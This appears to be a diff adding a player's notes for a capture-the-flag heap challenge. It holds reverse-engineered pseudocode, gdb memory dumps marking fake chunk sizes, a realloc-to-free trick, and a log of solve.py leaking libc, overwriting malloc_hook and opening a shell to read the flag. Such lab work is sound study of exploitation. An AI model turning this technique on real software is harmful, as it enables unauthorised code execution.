@@ -1,0 +1,173 @@
+free.grandprix.whitehatvn.com
+Port: 4597
+
+
+
+gdb-peda$ checksec
+CANARY    : ENABLED
+FORTIFY   : ENABLED
+NX        : ENABLED
+PIE       : disabled
+RELRO     : FULL
+
+What's your name?
+A
+What's your age?
+12
+----------------
+1. add a chunk 
+2. edit a chunk 
+3. show a chunk 
+4. information 
+5. exit
+----------------
+Your choice:
+
+name = 0x602050
+*name = malloc(0x20)
+
+age = 0x602058
+*age = actual integer
+
+sizes[]  @ 0x602080
+
+chunks[] @ 0x602100
+
+
+can allocate 16 chunks
+can only edit first 10 chunks?
+
+
+[!]if you realloc(chunk, 0x0), you just free(chunk) without mallocing new one
+
+
+add
+===
+[!] only can allocate first 3 chunks < 0x100 bytes
+chunks[idx] = malloc(size)
+sizes[idx] = size
+read(0, chunks[idx], size)
+
+
+edit
+====
+read(0, chunks[idx], size[idx])
+[!] only can edit idx 0-9
+
+
+view
+====
+puts(chunks[idx])
+
+
+info
+====
+read(0, newName, 0x28)
+length = strlen(newName)
+realloc(name, length)
+strncpy(name, newName, length)
+
+[!] if you realloc w/size 0, *name is the same!
+
+
+gdb-peda$ x/100xg 0x00602000
+0x602000:       0x0000000000000000      0x0000000000000000
+0x602010:       0x0000000000000000      0x0000000000000000
+0x602020 <stdout@@GLIBC_2.2.5>: 0x00007ffff7dd2620      0x0000000000000000
+0x602030 <stdin@@GLIBC_2.2.5>:  0x00007ffff7dd18e0      0x0000000000000000
+0x602040 <stderr@@GLIBC_2.2.5>: 0x00007ffff7dd2540      0x0000000000000000
+0x602050 <name>:        0x0000000000603010      0x000000000000000a
+0x602060 <count>:       0x0000000000000000      0x0000000000000000
+0x602070:       0x0000000000000000      0x0000000000000000
+0x602080 <l>:   0x0000000000000050      0x0000000000000000
+0x602090 <l+16>:        0x0000000000000000      0x0000000000000000
+0x6020a0 <l+32>:        0x0000000000000000      0x0000000000000000
+0x6020b0 <l+48>:        0x0000000000000000      0x0000000000000000
+0x6020c0 <l+64>:        0x0000000000000000      0x0000000000000000
+0x6020d0 <l+80>:        0x0000000000000000      0x0000000000000000
+0x6020e0 <l+96>:        0x0000000000000000      0x0000000000000000
+0x6020f0 <l+112>:       0x0000000000000000      0x0000000000000000 <--put 0x20 here
+0x602100 <n>:   0x0000000000603040      0x0000000000000000
+0x602110 <n+16>:        0x0000000000000000      0x0000000000000000
+0x602120 <n+32>:        0x0000000000000000      0x0000000000000000
+0x602130 <n+48>:        0x0000000000000000      0x0000000000000000
+0x602140 <n+64>:        0x0000000000000000      0x0000000000000000
+0x602150 <n+80>:        0x0000000000000000      0x0000000000000000
+0x602160 <n+96>:        0x0000000000000000      0x0000000000000000
+0x602170 <n+112>:       0x0000000000000000      0x0000000000000000
+0x602180:       0x0000000000000000      0x0000000000000000
+
+
+
+
+
+gdb-peda$ x/100xg 0x602050
+0x602050 <name>:        0x0000000000603010      0x0000000000000539
+0x602060 <count>:       0x0000000000000000      0x0000000000000000
+0x602070:       0x0000000000000000      0x0000000000000000
+0x602080 <l>:   0x0000000000000021      0x0000000000000031
+0x602090 <l+16>:        0x0000000000002000      0x0000000000002000 <-- fake sizes = 0x2000
+0x6020a0 <l+32>:        0x0000000000002000      0x0000000000002000
+0x6020b0 <l+48>:        0x0000000000002000      0x0000000000000000
+0x6020c0 <l+64>:        0x0000000000000000      0x0000000000000000
+0x6020d0 <l+80>:        0x0000000000000000      0x0000000000000000
+0x6020e0 <l+96>:        0x0000000000000000      0x0000000000000000
+0x6020f0 <l+112>:       0x0000000000000000      0x0000000000000000
+0x602100 <n>:   0x0000000000603010      0x0000000000603040
+0x602110 <n+16>:        0x0000000000602090      0x0000000000000000 <-- 
+0x602120 <n+32>:        0x0000000000000000      0x0000000000000000
+0x602130 <n+48>:        0x0000000000000000      0x0000000000000000
+0x602140 <n+64>:        0x0000000000000000      0x0000000000000000
+0x602150 <n+80>:        0x0000000000000000      0x0000000000000000
+0x602160 <n+96>:        0x0000000000000000      0x0000000000000000
+0x602170 <n+112>:       0x0000000000000000      0x0000000000000000
+0x602180:       0x0000000000000000      0x0000000000000000
+0x602190:       0x0000000000000000      0x0000000000000000
+0x6021a0:       0x0000000000000000      0x0000000000000000
+0x6021b0:       0x0000000000000000      0x0000000000000000
+0x6021c0:       0x0000000000000000      0x0000000000000000
+0x6021d0:       0x0000000000000000      0x0000000000000000
+0x6021e0:       0x0000000000000000      0x0000000000000000
+
+
+
+➜  free python solve.py free.grandprix.whitehatvn.com 4597
+[*] For remote: solve.py HOST PORT
+[+] Opening connection to free.grandprix.whitehatvn.com on port 4597: Done
+[+] libc_base found at 0x7f046edbd000
+[+] heap_base found at 0x2af000
+[+] malloc_hook found at 0x7f046f181b10
+[+] one_shot found at 0x7f046eead274
+[*] Switching to interactive mode
+$ ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+my_ssh_key
+my_ssl_key
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+$ cat /home/free/flag
+3bcbd349b946dea26e4fb369a387ba5145ee3b7b
+$  
+
